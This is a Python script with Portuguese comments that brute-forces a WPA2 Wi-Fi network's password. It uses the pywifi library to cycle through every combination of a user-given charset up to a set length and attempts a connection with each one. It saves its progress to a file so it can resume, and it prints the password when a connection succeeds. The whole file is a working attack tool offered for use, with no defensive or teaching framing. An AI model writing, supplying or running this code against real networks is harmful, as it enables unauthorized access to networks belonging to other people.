from pywifi import PyWiFi, const, Profile
import itertools
import time
import os

def generate_passwords(start_password, max_length, charset):
    """Gera senhas de comprimento variável usando um conjunto de caracteres ordenado, começando de uma senha específica."""
    charset_sorted = ''.join(sorted(charset))  # Garante que o charset está ordenado
    start_length = len(start_password)
    first = True

    for length in range(start_length, max_length + 1):
        for password_tuple in itertools.product(charset_sorted, repeat=length):
            password = ''.join(password_tuple)
            if first:
                # Pula até a senha de início se especificada
                if password < start_password:
                    continue
                else:
                    first = False
            yield password

def save_state(password):
    """Salva a última senha testada em um arquivo no diretório do script."""
    file_path = os.path.join(os.path.dirname(__file__), "last_password.txt")
    with open(file_path, "w") as file:
        file.write(password)

def load_state():
    """Carrega a última senha testada de um arquivo no diretório do script."""
    file_path = os.path.join(os.path.dirname(__file__), "last_password.txt")
    try:
        with open(file_path, "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        return ""

def brute_force_wifi(ssid, interface, max_length, charset):
    wifi = PyWiFi()
    iface = wifi.interfaces()[interface]  # Seleciona a interface de rede

    iface.disconnect()  # Desconecta de qualquer rede Wi-Fi
    time.sleep(1)  # Espera por 1 segundo para garantir a desconexão

    profile = Profile()  # Cria um perfil de rede
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    last_password = load_state()  # Carrega a última senha testada
    for password in generate_passwords(last_password, max_length, charset):
        profile.key = password
        iface.remove_all_network_profiles()  # Remove perfis antigos
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)  # Tenta conectar
        time.sleep(2)  # Espera 2 segundos para verificar se a conexão foi bem-sucedida

        if iface.status() == const.IFACE_CONNECTED:
            print(f"Senha encontrada: {password}")
            iface.disconnect()
            return password
        else:
            print(f"Falha ao conectar com a senha: {password}")
        save_state(password)  # Salva a última senha testada

    print("Senha não encontrada.")
    return None

if __name__ == "__main__":
    ssid = input("Digite o SSID da rede Wi-Fi: ")
    interface_number = int(input("Digite o número da interface de rede (geralmente 0 ou 1): "))
    max_length = int(input("Digite o comprimento máximo da senha: "))
    charset = input("Digite o conjunto de caracteres a ser usado (por exemplo, 'abc123'): ")

    password = brute_force_wifi(ssid, interface_number, max_length, charset)
    if password:
        print(f"A senha correta é: {password}")
    else:
        print("Não foi possível encontrar a senha com as combinações geradas.")
